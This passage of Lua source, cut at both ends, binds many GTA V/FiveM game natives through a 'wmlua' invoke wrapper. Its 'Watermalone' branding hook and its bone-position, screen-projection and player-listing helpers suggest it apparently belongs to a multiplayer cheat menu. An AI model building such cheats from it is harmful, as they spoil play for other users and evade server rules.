        return wmlua.H.WMInvokeNative(0x9F8AA94D6D97DBF4, ped, toggle)
    end

    function wmlua.N.TaskCombatPed(ped, targetPed, p2, p3)
        return wmlua.H.WMInvokeNative(0xF166E48407BAC484, ped, targetPed, p2, p3)
    end
    
    function wmlua.N.SetGameplayCamRelativeRotation(roll, pitch, yaw)
        return wmlua.H.WMInvokeNative(0x48608C3464F58AB4, roll, pitch, yaw)
    end

    function wmlua.N.SetPedCombatMovement(ped, combatMovement)
        return wmlua.H.WMInvokeNative(0x4D9CA1009AFBD057, ped, combatMovement)
    end
    
    function wmlua.N.SetGameplayCamShakeAmplitude(amplitude)
        return wmlua.H.WMInvokeNative(0xA87E00932DB4D85D, amplitude)
    end

    function wmlua.N.DetachEntity(entity, p1, collision)
        return wmlua.H.WMInvokeNative(0x961AC54BF0613F5D, entity, p1, collision)
    end

    function wmlua.N.SetPedPathCanDropFromHeight(ped, Toggle)
        return wmlua.H.WMInvokeNative(0xE361C5C71C431A4F, ped, Toggle)
    end
    
    function wmlua.N.SetGameplayCamVehicleCamera(vehicleName)
        return wmlua.H.WMInvokeNative(0x21E253A7F8DA5DFB, tostring(vehicleName))
    end

    function wmlua.N.SetVehicleCustomSecondaryColour(vehicle, r, g, b)
        return wmlua.H.WMInvokeNative(0x36CED73BFED89754, vehicle, r, g, b)
    end
    
    function wmlua.N.SetGameplayCamVehicleCameraName(vehicleModel)
        return wmlua.H.WMInvokeNative(0x11FA5D3479C7DD47, vehicleModel)
    end

    function wmlua.N.GetGameplayCamRelativePitch()
        return wmlua.H.WMInvokeNative(0x3A6867B4845BEDA2, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end

    function wmlua.N.SetPedShootRate(ped, shootRate)
        return wmlua.H.WMInvokeNative(0x614DA022990752DC, ped, shootRate)
    end

    function wmlua.N.SetVehicleCustomPrimaryColour(vehicle, r, g, b)
        return wmlua.H.WMInvokeNative(0x7141766F91D15BEA, vehicle, r, g, b)
    end

    function wmlua.N.GetEntityPlayerIsFreeAimingAt(player, entity)
        return wmlua.H.WMInvokeNative(0x2975C866E6713290, player, wmlua.H.PointerValueIntInitialized(entity)) --[ [ may be optional ] ], wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetBlipRotation(blip, rotation)
        return wmlua.H.WMInvokeNative(0xF87683CDF73C3F6E, blip, rotation)
    end

    function wmlua.N.GetDuiHandle(duiObject)
        return wmlua.H.WMInvokeNative(0x1655d41d, duiObject, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsString())
    end

    function wmlua.N.SetPedCombatRange(ped, p1)
        return wmlua.H.WMInvokeNative(0x3C606747B23E497B, ped, p1)
    end

    function wmlua.N.GetGameplayCamRot(rotationOrder)
        return wmlua.H.WMInvokeNative(0x837765A25378F0BB, rotationOrder, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
    end

    function wmlua.N.SetPedPathPreferToAvoidWater(ped, avoidWater)
        return wmlua.H.WMInvokeNative(0x38FE1EC73743793C, ped, avoidWater)
    end

    function wmlua.N.ClearPedBloodDamage(ped)
        return wmlua.H.WMInvokeNative(0x8FE22675A5A45817, ped)
    end

    function wmlua.N.SetPedCombatAttributes(ped, attributeIndex, enabled)
        return wmlua.H.WMInvokeNative(0x9F7794730795E019, ped, attributeIndex, enabled)
    end

    function wmlua.N.SetVehicleNumberPlateText(vehicle, plateText)
        return wmlua.H.WMInvokeNative(0x95A88F0B409CDA47, vehicle, tostring(plateText))
    end

    function wmlua.N.SetVehicleNumberPlateTextIndex(vehicle, plateIndex)
        return wmlua.H.WMInvokeNative(0x9088EB5A43FFB0A1, vehicle, plateIndex)
    end

    function wmlua.N.SetVehicleColours(vehicle, colorPrimary, colorSecondary)
        return wmlua.H.WMInvokeNative(0x4F1D4BE3A7F24601, vehicle, colorPrimary, colorSecondary)
    end

    function wmlua.N.RemoveAnimDict(animDict)
        return wmlua.H.WMInvokeNative(0xF66A602F829E2A06, tostring(animDict))
    end

    function wmlua.N.SetHeliBladesFullSpeed(vehicle)
        return wmlua.H.WMInvokeNative(0xA178472EBB8AE60D, vehicle)
    end

    function wmlua.N.ControlLandingGear(vehicle, state)
        return wmlua.H.WMInvokeNative(0xCFC8BE9A5E1FE575, vehicle, state)
    end

    function wmlua.N.TaskPlaneMission(pilot, aircraft, targetVehicle, targetPed, destinationX, destinationY, destinationZ, missionFlag, angularDrag, unk, targetHeading, maxZ, minZ)
        return wmlua.H.WMInvokeNative(0x23703CD154E83B88, pilot, aircraft, targetVehicle, targetPed, destinationX, destinationY, destinationZ, missionFlag, angularDrag, unk, targetHeading, maxZ, minZ)
    end

    function wmlua.N.ClearTimecycleModifier()
        return wmlua.H.WMInvokeNative(0x0F07E7745A236711)
    end

    function wmlua.N.SetEntityCollision(entity, toggle, keepPhysics)
        return wmlua.H.WMInvokeNative(0x1A9205C1B9EE827F, entity, toggle, keepPhysics)
    end

    function wmlua.N.SetVehicleEngineOn(vehicle, value, instantly, disableAutoStart)
        return wmlua.H.WMInvokeNative(0x2497C4717C8B881E, vehicle, value, instantly, disableAutoStart)
    end

    function wmlua.N.SetEntityProofs(entity, bulletProof, fireProof, explosionProof, collisionProof, meleeProof, p6, p7, drownProof)
        return wmlua.H.WMInvokeNative(0xFAEE099C6F890BB8, entity, bulletProof, fireProof, explosionProof, collisionProof, meleeProof, p6, p7, drownProof)
    end

    function wmlua.N.CreatePedInsideVehicle(vehicle, pedType, modelHash, seat, isNetwork, netMissionEntity)
        if not wmlua.N.HasModelLoaded(modelHash) then
            while not wmlua.N.HasModelLoaded(modelHash) do
                wmlua.N.RequestModel(modelHash)
                wmlua_Schleep(0)
            end
        end
        local spawn = false
        if wmlua.V.elq_last and wmlua.V.elq and wmlua.N.Get_GameTimer() > wmlua.V.elq_last + wmlua.V.elq or not wmlua.V.elq_last then
            spawn = true
        end
        if spawn then
            return wmlua.H.WMInvokeNative(0x7DD959874C1FD534, vehicle, pedType, modelHash, seat, isNetwork, netMissionEntity, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
        else
            return nil
        end
    end

    function wmlua.N.SetPedRandomComponentVariation(ped, p1)
        return wmlua.H.WMInvokeNative(0xC8A9481A01E63C28, ped, p1)
    end

    function wmlua.N.SetVehicleHandlingField(vehicle, class, fieldName, value)
        return wmlua.H.WMInvokeNative(0x2ba40795, vehicle, tostring(class), tostring(fieldName), value)
    end

    function wmlua.N.SetVehicleHandlingFloat(vehicle, class, fieldName, value)
        return wmlua.H.WMInvokeNative(0x488c86d2, vehicle, tostring(class), tostring(fieldName), value)
    end

    function wmlua.N.DeleteIncident(incidentId)
        return wmlua.H.WMInvokeNative(0x556C1AA270D5A207, incidentId)
    end

    function wmlua.N.PointCamAtEntity(cam, entity, p2, p3, p4, p5)
        return wmlua.H.WMInvokeNative(0x5640BFF86B16E8DC, cam, entity, p2, p3, p4, p5)
    end

    function wmlua.N.IsPedSprinting(p1)
        return wmlua.H.WMInvokeNative(0x57E457CD2C0FC168, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.IsPedSwimming(p1)
        return wmlua.H.WMInvokeNative(0x9DE327631295B4C2, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.GetVehiclePedIsUsing(p1)
        return wmlua.H.WMInvokeNative(0x6094AD011A2EA87D, p1, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetOffsetFromEntityInWorldCoords(p1,p2,p3,p4)
        return wmlua.H.WMInvokeNative(0x1899F328B0E12848, p1, p2, p3, p4, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
    end

    function wmlua.N.SetVehicleModKit(vehicle, modKit)
        return wmlua.H.WMInvokeNative(0x1F2AA07F00B3217A, vehicle, modKit)
    end

    function wmlua.N.SetEntityHealth(entity, health)
        return wmlua.H.WMInvokeNative(0x6B76DC1F3AE6E6A3, entity, health)
    end

    function wmlua.N.GetPlayerFromPed(ped)
        return wmlua.H.WMInvokeNative(0x6C0E2E0125610278, ped, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetSelectedPedWeapon(ped)
        return wmlua.H.WMInvokeNative(0x0A6DB4965674D243, ped, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetWeaponDamage(weaponHash, componentHash)
        return wmlua.H.WMInvokeNative(0x3133B907D8B32053, wmlua.N.GetHashKey(weaponHash), componentHash, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end

    function wmlua.N.SetVehicleMod(vehicle, modType, modIndex, customTires)
        return wmlua.H.WMInvokeNative(0x6AF0636DDEDCB6DD, vehicle, modType, modIndex, customTires)
    end

    function wmlua.N.HudWeaponWheelIgnoreSelection()
        return wmlua.H.WMInvokeNative(0x0AFC4AF510774B47)
    end

    function wmlua.N.IsEntityDead(entity)
        return wmlua.H.WMInvokeNative(0x5F9532F3B5CC2551, entity, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.AddArmourToPed(ped, amount)
        return wmlua.H.WMInvokeNative(0x5BA652A0CD14DF2F, ped, amount)
    end

    function wmlua.N.CreateRuntimeTextureFromDuiHandle(txd, txn, duiHandle)
        return wmlua.H.WMInvokeNative(0xb135472b, txd, tostring(txn), tostring(duiHandle), wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsLong())
    end

    function wmlua.N.IsCamRendering(p1)
        return wmlua.H.WMInvokeNative(0x02EC0AF5C5A49B7A, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetVehicleDirtLevel(vehicle, dirtLevel)
        return wmlua.H.WMInvokeNative(0x79D3B596FE44EE8B, vehicle, dirtLevel)
    end

    function wmlua.N.DoesBlipExist(blip)
        return wmlua.H.WMInvokeNative(0xA6DB27D19ECBB7DA, blip, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetCamFov(cam, fieldOfView)
        return wmlua.H.WMInvokeNative(0xB13C14F66A00D047, cam, fieldOfView)
    end

    function wmlua.N.NetworkHasControlOfEntity(p1)
        return wmlua.H.WMInvokeNative(0x01BF60A500E28887, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetVehicleFixed(vehicle)
        return wmlua.H.WMInvokeNative(0x115722B1B9C14C1C, vehicle)
    end

    function wmlua.N.SetPedSuffersCriticalHits(ped, toggle)
        return wmlua.H.WMInvokeNative(0xEBD76F2359F190AC, ped, toggle)
    end

    function wmlua.N.GetFrameTime()
        return wmlua.H.WMInvokeNative(0x15C40837039FFAF7, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end

    function wmlua.N.RequestCollisionAtCoord(p1,p2,p3)
        return wmlua.H.WMInvokeNative(0x07503F7948F491A7, p1,p2,p3, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.DisableWeaponInputs(toggle)
        return wmlua.H.WMInvokeNative(0x14C9FDCC41F81F63, toggle)
    end

    function wmlua.N.GetCamRot(cam, rotationOrder)
        return wmlua.H.WMInvokeNative(0x7D304C1C955E3E12, cam, rotationOrder, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
    end

    function wmlua.N.SetDriverAbility(driver, ability)
        return wmlua.H.WMInvokeNative(0xB195FFA8042FC5C3, driver, ability)
    end

    function wmlua.N.RequestAnimDict(animDict)
        return wmlua.H.WMInvokeNative(0xD3BD40951412FEF6, tostring(animDict))
    end

    function wmlua.N.PlaceObjectOnGroundProperly(object)
        return wmlua.H.WMInvokeNative(0x58A850EAEE20FAA3, object, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetPedUsingActionMode(ped, p1, p2, action)
        return wmlua.H.WMInvokeNative(0xD75ACCF5E0FB5367, ped, p1, p2, tostring(action))
    end
    
    function wmlua.N.SetVehicleUndriveable(vehicle, toggle)
        return wmlua.H.WMInvokeNative(0x8ABA6AF54B942B95, vehicle, toggle)
    end

    function wmlua.N.DestroyCam(cam, thisScriptCheck)
        return wmlua.H.WMInvokeNative(0x865908C81A2C22E9, cam, thisScriptCheck)
    end

    function wmlua.N.IsModelValid(model)
        return wmlua.H.WMInvokeNative(0xC0296A2EDF545E92, model, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.AttachCamToEntity(cam, entity, xOffset, yOffset, zOffset, isRelative)
        return wmlua.H.WMInvokeNative(0xFEDB7D269E8C60E3, cam, entity, xOffset, yOffset, zOffset, isRelative)
    end
    
    function wmlua.N.SetVehicleEngineHealth(vehicle, health)
        return wmlua.H.WMInvokeNative(0x45F6D8EEF34ABEF1, vehicle, health)
    end

    function wmlua.N.GetDisabledControlNormal(p1,p2)
        return wmlua.H.WMInvokeNative(0x11E65974A982637C, p1,p2, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end

    function wmlua.N.IsPedWalking(p1)
        return wmlua.H.WMInvokeNative(0xDE4C184B2B9B071A, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetPedGeneratesDeadBodyEvents(ped, toggle)
        return wmlua.H.WMInvokeNative(0x7FB17BA2E7DECA5B, ped, toggle)
    end

    function wmlua.N.CreateIncidentWithEntity(dispatchService, ped, numUnits, radius, outIncidentID)
        return wmlua.H.WMInvokeNative(0x05983472F0494E60, dispatchService, ped, numUnits, radius, wmlua.H.PointerValueIntInitialized(outIncidentID)) --[ [ may be optional ] ], wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.GetNextBlipInfoId(blipSprite)
        return wmlua.H.WMInvokeNative(0x14F96AA50D6FBEA7, blipSprite, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.ScGetNickname()
        return wmlua.H.WMInvokeNative(0x198D161F458ECC7F, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsString())
    end

    function wmlua.N.CreateRuntimeTxd(name)
        return wmlua.H.WMInvokeNative(0x1f3ac778, tostring(name), wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsLong())
    end

    function wmlua.N.IsPedBeingStunned(p1, p2)
        return wmlua.H.WMInvokeNative(0x4FBACCE3B4138EE8, p1, p2, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetCamRot(cam, rotX, rotY, rotZ, rotationOrder)
        return wmlua.H.WMInvokeNative(0x85973643155D0B07, cam, rotX, rotY, rotZ, rotationOrder)
    end

    function wmlua.N.AddBlipForEntity(p1)
        return wmlua.H.WMInvokeNative(0x5CDE92C702A8FCE7, p1, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.DoesCamExist(p1)
        return wmlua.H.WMInvokeNative(0xA7A932170592B50E, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetPedAccuracy(ped, accuracy)
        return wmlua.H.WMInvokeNative(0x7AEFB85C1D49DEB6, ped, accuracy, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetControlInstructionalButton(inputGroup, control, p2)
        return wmlua.H.WMInvokeNative(0x0499D7B09FC9B407, inputGroup, control, p2, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsString())
    end

    function wmlua.N.SetPedRagdollOnCollision(ped, toggle)
        return wmlua.H.WMInvokeNative(0xF0A4F1BBF4FA7497, ped, toggle)
    end

    function wmlua.N.SetVehicleForwardSpeed(vehicle, speed)
        return wmlua.H.WMInvokeNative(0xAB54A438726D25D5, vehicle, speed)
    end

    function wmlua.N.SetPedCanSwitchWeapon(ped, toggle)
        return wmlua.H.WMInvokeNative(0xED7F7EFE9FABF340, ped, toggle)
    end

    function wmlua.N.GetCamPos(p1)
        return wmlua.H.WMInvokeNative(0xBAC038F7459AE5AE, p1, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
    end

    function wmlua.N.IsPedStill(p1)
        return wmlua.H.WMInvokeNative(0xAC29253EEF8F0180, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.GetLabelText(p1)
        return wmlua.H.WMInvokeNative(0x7B5280EBA9840C72, p1, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsString())
    end

    function wmlua.N.GetEntityRotation(entity, rotationOrder)
        return wmlua.H.WMInvokeNative(0xAFBD61CC738D9EB9, entity, rotationOrder, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
    end

    function wmlua.N.IsPauseMenuActive()
        return wmlua.H.WMInvokeNative(0xB0034A223497FFCB, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetPedCanUseLadders(ped, Toggle)
        return wmlua.H.WMInvokeNative(0x77A5B103C87F476E, ped, Toggle, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetEntityHeading(entity)
        return wmlua.H.WMInvokeNative(0xE83D4F9BA2A38914, entity, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end

    function wmlua.N.GetModTextLabel(vehicle, modType, modValue)
        return wmlua.H.WMInvokeNative(0x8935624F8C5592CC, vehicle, modType, modValue, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsString())
    end

    function wmlua.N.GetPedInVehicleSeat(vehicle, index)
        return wmlua.H.WMInvokeNative(0xBB40DD2270B65366, vehicle, index, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.SetDuiUrl(duiObject, url)
        return wmlua.H.WMInvokeNative(0xf761d9f3, duiObject, tostring(url))
    end

    function wmlua.N.SetVehicleJetEngineOn(vehicle, toggle)
        return wmlua.H.WMInvokeNative(0xB8FBC8B1330CA9B4, vehicle, toggle)
    end

    function wmlua.N.GetBlipInfoIdType(blip)
        return wmlua.H.WMInvokeNative(0xBE9B0959FFD0779B, blip, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetEntitySpeed(entity)
        return wmlua.H.WMInvokeNative(0xD5037BA82E12416F, entity, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end
    --- Relative can be used for getting speed relative to the frame of the vehicle, to determine for example, if you are going in reverse (-y speed) or not (+y speed).
    function wmlua.N.GetEntitySpeedVector(entity, relative)
        return wmlua.H.WMInvokeNative(0x9A8D700A51CB7B0D, entity, relative, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
    end

    function wmlua.N.CreateDUI(p1,p2,p3)
        return wmlua.H.WMInvokeNative(0x23EAF899, p1,p2,p3, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsLong())
    end

    function wmlua.N.CreateGamerTag(p1,p2,p3,p4,p5,p6)
        return wmlua.H.WMInvokeNative(0xBFEFE3321A3F5015, p1,p2,p3,p4,p5,p6, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.NetIsPlayerActive(p1)
        return wmlua.H.WMInvokeNative(0xB8DFD30D6973E135, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.UnlockMinimapPosition()
        return wmlua.H.WMInvokeNative(0x3E93E06DB8EF1F30)
    end

    function wmlua.N.CanTiresPop(p1) -- not working? ok
        return wmlua.H.WMInvokeNative(0x678B9BB8C3F58FEB, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.IsPed_Shooting(p1)
        return wmlua.H.WMInvokeNative(0x34616828CD07F1A1, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.SetScopeZoomFactor(p0)
        return wmlua.H.WMInvokeNative(0x70894BD0915C5BCA, p0)
    end

    function wmlua.N.GetScopeZoomFactor()
        return wmlua.H.WMInvokeNative(0x7EC52CC40597D170, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end

    function wmlua.N.ResetPedVisibleDamage(ped)
        return wmlua.H.WMInvokeNative(0x3AC1F7B898F30C05, ped, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetGroundZFor_3dCoord(x, y, z, unk)
        return wmlua.H.WMInvokeNative(0xC906A7DAB05C8D2B, x, y, z, wmlua.H.PointerValueFloat(), unk, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.IsEntityAPed(p1)
        return wmlua.H.WMInvokeNative(0x524AC5ECEA15343E, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.IsEntityAVehicle(entity)
        return wmlua.H.WMInvokeNative(0x6AC7003FA6E5575E, entity, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.GetVehiclePedIsIn(p1, p2)
        return wmlua.H.WMInvokeNative(0x9A9112A0FE9A4713, p1, p2, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetCamHeading(p1)
        local kek = wmlua.H.WMInvokeNative(0x7D304C1C955E3E12, p1, 2, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
        return kek[3]
    end

    function wmlua.N.SetEntityHeading(p1,p2)
        return wmlua.H.WMInvokeNative(0x8E2530AA8ADA980E, p1,p2)
    end

    function wmlua.N.CastRayToPoint(p1,p2,p3,p4,p5,p6,p7,p8,p9)
        return wmlua.H.WMInvokeNative(0x377906D8A31E5586, p1,p2,p3,p4,p5,p6,p7,p8,p9, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetRaycastResult(p1)
        return wmlua.H.WMInvokeNative(0x3D87450E15D98694, p1, wmlua.H.PointerValueInt(), wmlua.H.PointerValueVector(), wmlua.H.PointerValueVector(), wmlua.H.PointerValueInt(), wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.DrawBox(x1, y1, z1, x2, y2, z2, red, green, blue, alpha)
        return wmlua.H.WMInvokeNative(0xD3A9971CADAC7252, x1, y1, z1, x2, y2, z2, red, green, blue, alpha)
    end

    function wmlua.N.GetVehicleMod(p1, p2)
        return wmlua.H.WMInvokeNative(0x772960298DA26FDB, p1, p2, wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetEntBonePos(p1,p2,p3)
        local pos = wmlua.H.WMInvokeNative(0x17C07FC640E86B4E, p1,p2,0.0,0.0,0.0, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
        if p3 then
            pos = vector3(pos.x,pos.y,pos.z + p3)
        end
        return pos
    end

    function wmlua.N.GetEntityMaxHealth(entity)
        return wmlua.H.WMInvokeNative(0x15D757606D170C3C, entity, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetInputMethod(p1)
        return wmlua.H.WMInvokeNative(0xA571D46727E2B718, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.World3dToScreen(p1,p2,p3)
        return wmlua.H.WMInvokeNative(0x34E82F05DF2974F5, p1, p2, p3, wmlua.H.PointerValueFloat(), wmlua.H.PointerValueFloat(), wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.CompareDistance(p1,p2,p3, p4,p5,p6)
        return wmlua.H.WMInvokeNative(0x2A488C176D52CCA5, p1,p2,p3, p4,p5,p6, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end

    function wmlua.N.GetPlayerServerId(p1)
        return wmlua.H.WMInvokeNative(0x4D97BCC7, p1, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.AddTextComponentSubstringPlayerName(text)
        if de_wr_hook then
            text = text:gsub("WM",identity.short)
            text = text:gsub("wm",identity.short)
            text = text:gsub("Watermalone",identity.long)
        end
        return wmlua.H.WMInvokeNative(0x6C188BE134E074AA, text)
    end

    function wmlua.N.GetWorldPositionOfEntityBone(entity, boneIndex)
        return wmlua.H.WMInvokeNative(0x44A8FCB8ED227738, entity, boneIndex, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
    end
    
    function wmlua.N.GetWorldPositionOfEntityBone_2(entity, boneIndex)
        return wmlua.H.WMInvokeNative(0x46F8696933A63C9B, entity, boneIndex, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
    end
    
    function wmlua.N.GetWorldRotationOfEntityBone(entity, boneIndex)
        return wmlua.H.WMInvokeNative(0xCE6294A232D03786, entity, boneIndex, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
    end

    function wmlua.N.GetEntityBoneIndexByName(entity, boneName)
        return wmlua.H.WMInvokeNative(0xFB71170B7E76ACBA, entity, tostring(boneName), wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.IsVehicleSeatFree(vehicle, seatIndex)
        return wmlua.H.WMInvokeNative(0x22AC59A870E6A669, vehicle, seatIndex, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.ResurrectPed(ped)
        return wmlua.H.WMInvokeNative(0x71BC8E838B9C6035, ped)
    end

    function wmlua.N.CreateCam(p1,p2)
        return wmlua.H.WMInvokeNative(0xC3981DCE61D9E13F, p1, p2, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetControlNormal(p1,p2)
        return wmlua.H.WMInvokeNative(0x11E65974A982637C, p1, p2, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsFloat())
    end

    function wmlua.N.GetVehicleName(p1)
        return wmlua.H.WMInvokeNative(0xB215AAC32D25D019, p1, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsString())
    end

    function wmlua.N.IsEntOnScreen(p1)
        return wmlua.H.WMInvokeNative(0xE659E47AF827484B, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.GetModelDimensions(p1)
        if type(p1) == "string" then p1 = wmlua.N.GetHashKey(p1) end
        return wmlua.H.WMInvokeNative(0x03E8D3D5F549087A, p1, wmlua.H.PointerValueVector(), wmlua.H.PointerValueVector())
    end

    function wmlua.N.GetEntList(p1)
        return msgpack.unpack(wmlua.H.WMInvokeNative(0x2B9D4F50, tostring(p1), wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsObject()))
    end

    function wmlua.N.GetPlayerName(p1)
        return wmlua.H.WMInvokeNative(0x6D0DE6A7B5DA71F8, p1, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsString())
    end

    function wmlua.N.IsPedMale(p1)
        return wmlua.H.WMInvokeNative(0x6D9F5FAA7488BA46, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.DoesEntityExist(p1)
        return wmlua.H.WMInvokeNative(0x7239B21A38F536BA, p1, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.IsPedInAVehicle(ped, AtGetIn)
        return wmlua.H.WMInvokeNative(0x997ABD671D25CA0B, ped, AtGetIn, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.IsPedArmed(p1,p2)
        return wmlua.H.WMInvokeNative(0x475768A975D5AD17, p1, p2, wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.GetLastBulletImpact(ped)
        return wmlua.H.WMInvokeNative(0x6C4D0409BA1A2BC2, ped, wmlua.H.PointerValueVector(), wmlua.H.ReturnResultAnyway())
    end

    function wmlua.N.PlayerId()
        return wmlua.H.WMInvokeNative(0x4F8644AF03D0E0D6, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetActivePlayers()
        return msgpack.unpack(wmlua.H.WMInvokeNative(0xCF143FB9, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsObject()))
    end

    function wmlua.N.SetEntityRecordsCollisions(entity, toggle)
        return wmlua.H.WMInvokeNative(0x0A50A1EEDAD01E65, entity, toggle)
    end

    function wmlua.N.GetEntityModel(p1)
        return wmlua.H.WMInvokeNative(0x9F47B058362C84B5, p1, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetEntityHealth(p1)
        return wmlua.H.WMInvokeNative(0xEEF059FAD016D209, p1, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetPedArmor(p1)
        return wmlua.H.WMInvokeNative(0x9483AF821605B1D8, p1, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetEntityPos(p1,p2)
        return wmlua.H.WMInvokeNative(0x3FEF770D40960D5A, p1, p2, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsVector())
    end

    function wmlua.N.GetCursorPos()
        return wmlua.H.WMInvokeNative(0xBDBA226F, wmlua.H.PointerValueInt(), wmlua.H.PointerValueInt())
    end

    function wmlua.N.GetResolution()
        return wmlua.H.WMInvokeNative(0x873C9F3104101DD3, wmlua.H.PointerValueInt(), wmlua.H.PointerValueInt())
    end

    function wmlua.N.GetNumResources()
        return wmlua.H.WMInvokeNative(0x863F27B, wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetResourceByFindIndex(i)
        return wmlua.H.WMInvokeNative(0x387246B7, i, wmlua.H.ResultAsString())
    end

    function wmlua.N.Get_GameTimer()
        return wmlua.H.WMInvokeNative(0x9CD27B0045628463, wmlua.H.ReturnResultAnyway(), wmlua.H.ResultAsInteger())
    end

    function wmlua.N.UpdateOnScreenKeyboard()
        return wmlua.H.WMInvokeNative(0x0CF2B696BBF945AE, wmlua.H.ResultAsInteger())
    end

    function wmlua.N.GetOnscreenKeyboardResult()
        return wmlua.H.WMInvokeNative(0x8362B09B91893647, wmlua.H.ResultAsString())
    end

    function wmlua.N.GetPlayerPed(p1)
        if p1 then
            return wmlua.H.WMInvokeNative(0x43A66C31C68491C0, p1, wmlua.H.ResultAsInteger())
        else
            return wmlua.H.WMInvokeNative(0xD80958FC74E988A6, wmlua.H.ResultAsInteger())
